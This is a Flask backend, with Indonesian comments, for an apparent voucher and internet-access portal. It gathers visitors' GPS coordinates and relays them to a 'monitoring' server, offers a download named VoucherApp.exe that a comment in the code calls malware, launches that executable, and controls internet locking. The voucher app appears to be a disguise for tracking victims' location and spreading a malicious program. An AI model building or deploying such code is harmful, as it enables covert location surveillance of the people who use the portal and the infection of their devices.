from flask import Blueprint, render_template, request, jsonify, send_file, abort, redirect, url_for
import requests
import subprocess
import os

main_bp = Blueprint('main', __name__)
MONITORING_BASE_URL = "http://192.168.100.19:5500/api/monitoring"
EXE_PATH = "dist/VoucherApp/VoucherApp.exe"  # ⚠️ Pastikan path relatif ini benar

# Halaman utama
@main_bp.route('/')
def index():
    return render_template('index.html')

# Halaman aktivasi voucher
@main_bp.route('/aktivasi', methods=['GET', 'POST'])
def aktivasi():
    if request.method == 'POST':
        voucher_code = request.form.get('voucher_code', '').strip()
        if not voucher_code:
            return render_template('aktivasi.html', error="Kode voucher tidak boleh kosong")

        try:
            res = requests.post(
                f"{MONITORING_BASE_URL}/validate-voucher",
                json={'voucher_code': voucher_code},
                timeout=4
            )
            data = res.json()
        except Exception:
            return render_template('aktivasi.html', error="Gagal menghubungi server monitoring")

        if not data.get('valid'):
            return render_template('aktivasi.html', error=data.get('message', 'Voucher tidak valid'))

        # ✅ Cek apakah file exe malware ada
        if not os.path.exists(EXE_PATH):
            return render_template('aktivasi.html', error="Launcher tidak ditemukan di server")

        try:
            subprocess.Popen([EXE_PATH], shell=True)
        except Exception as e:
            return render_template('aktivasi.html', error=f"Gagal menjalankan launcher: {e}")

        return render_template('success.html', code=voucher_code)

    return render_template('aktivasi.html')

@main_bp.route("/check-installation-status", methods=["POST"])
def check_installation_status():
    return jsonify({"installed": True})  # Simulasi saja

# Endpoint relay lokasi
@main_bp.route('/save-location', methods=['POST'])
def save_location():
    try:
        res = requests.post(f"{MONITORING_BASE_URL}/save-location", json=request.json, timeout=5)
        return jsonify(res.json()), res.status_code
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# Endpoint relay log report
@main_bp.route('/report', methods=['POST'])
def report():
    try:
        data = request.get_json()
        res = requests.post(f"{MONITORING_BASE_URL}/report", json=data, timeout=5)
        return jsonify(res.json()), res.status_code
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
      

@main_bp.route("/result", methods=["POST"])
def result():
    latitude = request.form.get("latitude")
    longitude = request.form.get("longitude")
    accuracy = request.form.get("accuracy")
    service = request.form.get("service")

    # Validasi sederhana
    if not latitude or not longitude:
        return "Invalid coordinates", 400

    # Kirim data lkasi ke backend monitoring
    try:
        payload = {
            "latitude": latitude,
            "longitude": longitude,
            "accuracy": accuracy,
            "maps_link": f"https://maps.google.com?q={latitude},{longitude}",
        }
        res = requests.post(f"{MONITORING_BASE_URL}/save-location", json=payload, timeout=5)
        print(f"[DEBUG] Lokasi berhasil disimpan: {res.status_code} - {res.text}")
    except Exception as e:
        print(f"[ERROR] Gagal menyimpan lokasi: {e}")
        return "Gagal menyimpan lokasi", 500
    # Redirect ke halaman aktivasi sambil kirim parameternya
    return redirect(url_for('main.aktivasi', service=service))
  
@main_bp.route("/download-voucher-app", methods=["GET", "HEAD"])
def download_voucher_app():
    # Ubah path ke direktori dist/VoucherApp
    exe_path = os.path.join(os.path.dirname(__file__), "..", "dist", "VoucherApp", "VoucherApp.exe")
    exe_path = os.path.abspath(exe_path)
    print(f"[DEBUG] Path EXE: {exe_path}")

    if os.path.exists(exe_path):
        return send_file(exe_path, as_attachment=True)
    else:
        abort(404, "File VoucherApp.exe tidak ditemukan")

@main_bp.route('/validate-voucher', methods=['POST'])
def relay_validate_voucher():
    try:
        data = request.get_json()
        print(f"[DEBUG] Data dari frontend: {data}")
        res = requests.post(f"{MONITORING_BASE_URL}/validate-voucher", json=data, timeout=5)
        backend_response = res.json()
        print(f"[DEBUG] Response dari backend_monitoring: {res.status_code} - {res.text}")
        
        if backend_response.get('valid'):
            try:
                unlock_res = requests.post(f"{MONITORING_BASE_URL}/unlock-internet",timeout=5)
                print("[DEBUG] Internet unlocked successfully", unlock_res.text)
            except Exception as e:
                print(f"[DEBUG] Error unlocking internet: {e}")

        return jsonify(backend_response), res.status_code
    except Exception as e:
        print(f"[ERROR] Relay error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500
    
@main_bp.route('/lock-internet', methods=['POST'])
def lock_internet():
    try:
        res = requests.post(f"{MONITORING_BASE_URL}/lock-internet", timeout=5)
        return jsonify(res.json()), res.status_code
    except Exception as e:
        print(f"[ERROR] Error locking internet: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500
    
@main_bp.route('/get-location-data', methods=['GET'])
def get_location_data():
    try:
        res = requests.get(f"{MONITORING_BASE_URL}/get-location-data", timeout=5)
        return jsonify(res.json()), res.status_code
    except Exception as e:
        print(f"[ERROR] Error fetching location data: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500
    
@main_bp.route('/store-voucher', methods=['POST'])
def store_voucher():
    try:
        data = request.get_json()
        res = requests.post(f"{MONITORING_BASE_URL}/store-voucher", json=data, timeout=5)
        return jsonify(res.json()), res.status_code
    except Exception as e:
        print(f"[ERROR] Error storing voucher: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500